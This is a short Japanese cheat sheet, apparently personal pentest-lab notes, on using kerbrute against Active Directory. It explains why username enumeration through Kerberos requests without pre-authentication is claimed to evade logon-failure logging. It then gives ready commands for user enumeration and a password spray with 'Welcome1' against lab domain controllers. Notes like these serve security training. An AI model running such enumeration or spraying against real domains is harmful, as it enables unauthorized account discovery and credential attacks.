# kerbture
AD環境への攻撃で、ユーザ名を列挙するときに使える。  
仕組みとしてkerbruteはKerberos Pre Authenticationをスキップするため、Windowsイベントログにてログオン失敗のログが発生しない。  
ログオンではなく、Kerberos Pre AuthenticationをせずTGSの要求を行った時のレスポンスによってそのユーザ名がドメイン内で有効化どうかを判断しているよう。  
なのでKerbruteでのドメインユーザ列挙はステルス性が高く高速であるといえる。  
ただしSMBではなくLDAPの認証はしていることになるので、4771: Failed Kerberos Pre Authenticationのイベントは残る。

## コマンド集

1. aa
```
kerbrute userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclits/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.175
```

2. inlanefreight.lcoalドメインにて、ドメコンを指定して、有効なドメインユーザをjsmith.txtを使ってスキャンする。
```
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

3. Welcome1というパスワードを使って、有効なドメインユーザに対してパスワードスプレーを行う。
```
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```